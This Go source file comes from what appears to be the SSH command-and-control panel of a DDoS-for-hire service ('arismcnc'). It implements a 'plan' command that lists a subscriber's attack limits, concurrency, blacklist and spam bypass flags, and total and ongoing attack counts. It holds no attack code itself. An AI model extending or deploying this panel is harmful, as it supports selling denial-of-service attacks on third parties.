package cmds

import (
	"arismcnc/database"
	"arismcnc/utils"
	"fmt"
	"io"
	"log"
	"strconv"
	"time"

	"github.com/gliderlabs/ssh"
)


type PlanCommand struct{}

func (c *PlanCommand) Name() string {
	return "Plan"
}

func (c *PlanCommand) Execute(session ssh.Session, db *database.Database, args []string, output io.Writer) {
	userInfo := db.GetAccountInfo(session.User())
	
	expiryTime, err := time.Parse("2006-01-02 15:04:05", userInfo.Expiry)
	if err != nil {
		log.Print(err)
	}

	
	creationTime, err := time.Parse("2006-01-02 15:04:05", userInfo.CreatedAt)
	if err != nil {
		log.Printf("Error parsing creation time: %v", err)
		creationTime = time.Now() 
	}

	
	daysTillExpiry := calculateDaysTillExpiry(expiryTime)
	creationDate := formatDate(creationTime)
	daysSinceCreation := calculateDaysSinceCreation(creationTime)
	
	
	totalAttacks := db.GetUserTotalAttacks(userInfo.Username)
	ongoingAttacks := db.GetUserOngoingAttacks(userInfo.Username)

	planBranding := utils.Branding(session, "account-details", map[string]interface{}{
		"user.Username":                session.User(),
		"user.Expiry":                  utils.CalculateExpiryString(expiryTime),
		"user.Admin":                   utils.CalculateInt(userInfo.Admin),
		"user.Vip":                     utils.CalculateInt(userInfo.Vip),
		"user.Private":                 utils.CalculateInt(userInfo.Private),
		"user.Concurrents":             strconv.Itoa(userInfo.Concurrents),
		"user.Cooldown":                strconv.Itoa(userInfo.Cooldown),
		"user.Maxtime":                 strconv.Itoa(userInfo.Maxtime),
		"user.Api_access":              utils.CalculateInt(userInfo.ApiAccess),
		"user.Power_saving_bypass":     utils.CalculateInt(userInfo.PowerSaving),
		"user.Spam_bypass":             utils.CalculateInt(userInfo.BypassSpam),
		"user.Blacklist_bypass":        utils.CalculateInt(userInfo.BypassBlacklist),
		"user.SSH_Client":              session.Context().ClientVersion(),
		"user.Created_by":              userInfo.CreatedBy,
		"user.Total_attacks":           strconv.Itoa(totalAttacks),
		"user.DaysTillPlanExpiry":      daysTillExpiry,
		"user.AccountCreationDate":     creationDate,
		"user.DaysSincePlanCreation":   daysSinceCreation,
		
		"user.TotalAttackCount":        strconv.Itoa(totalAttacks),
		"user.OngoingAttackCount":      strconv.Itoa(ongoingAttacks),
		"clear":                        "\x1b[2J \x1b[H",
		"sleep": func(duration int) {
			time.Sleep(time.Duration(duration) * time.Millisecond)
		},
	})

	fmt.Fprintln(output, planBranding)
}

func (c *PlanCommand) AdminOnly() bool {
	return false
}


func (c *PlanCommand) Aliases() []string {
	return []string{"info", "plan"}
}


func formatDate(t time.Time) string {
	return t.Format("2006-01-02")
}

func calculateDaysTillExpiry(expiryTime time.Time) string {
	now := time.Now()
	if expiryTime.Before(now) {
		return "0" 
	}
	days := int(expiryTime.Sub(now).Hours() / 24)
	if days < 0 {
		days = 0
	}
	return strconv.Itoa(days)
}


func calculateDaysSinceCreation(creationTime time.Time) string {
	now := time.Now()
	duration := now.Sub(creationTime)
	
	days := int(duration.Hours() / 24)
	hours := int(duration.Hours()) % 24
	
	if days < 0 {
		days = 0
		hours = 0
	}
	
	
	return fmt.Sprintf("%02d.%02d", days, hours)
}


func init() {
	CommandMap["plan"] = &PlanCommand{}
}